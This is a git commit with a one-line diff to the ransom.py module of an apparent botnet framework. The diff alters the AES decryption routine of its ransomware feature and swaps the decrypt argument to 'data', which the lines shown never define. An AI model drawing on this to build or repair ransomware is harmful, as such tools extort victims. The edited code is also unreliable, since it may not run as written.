6db1267ad040a8f2b52ecb33a5b692499bddcf6d
test <test@test.com>
2025-01-24 15:47:28 -0600

    trying random things

--- byob/modules/ransom.py
+++ byob/modules/ransom.py
@@ -251,7 +251,7 @@ def decrypt_ransom_aes(ciphertext, key, padding=chr(0)):
         cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce=nonce)
         
         # Decrypt and verify the ciphertext
-        plaintext = cipher.decrypt(ciphertext)
+        plaintext = cipher.decrypt(data)
 
     except Exception as e:
         log("{} error: {}".format(decrypt_ransom_aes.__name__, str(e)))
